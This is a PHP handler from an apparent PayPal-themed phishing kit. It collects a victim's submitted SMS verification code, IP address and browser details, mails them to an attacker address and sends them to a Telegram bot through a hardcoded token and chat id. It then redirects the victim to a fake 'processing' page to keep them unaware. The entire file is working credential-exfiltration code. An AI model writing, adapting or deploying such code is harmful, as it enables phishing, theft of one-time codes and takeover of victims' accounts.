<?php 
session_start();
error_reporting(0);
//require_once('./teleg.php');
$IP = getenv("REMOTE_ADDR");
$_SESSION["cc"] = $_POST["cc"];
$message .= "<----PPLSMS1------>\n";
$message .= " [ sms1 ] : [  ".$_POST['login_email']." ] \n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- MR-0X ----------------------\n";
$sender = "EMAIL";
$subject = "SMS1  [ " . $IP . " ] ";
$email = "".$EX445093_REMOT."";
mail($email,$subject,$message);
$token = "7635188445:AAGK4C3dS2dmXPwhqmI2XssOmNbHmLG8zW0";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-6415353745&text=" . urlencode($message)."" );




/////////////////////////////////////////////////////////

header("Location: ./processing2.html");
?>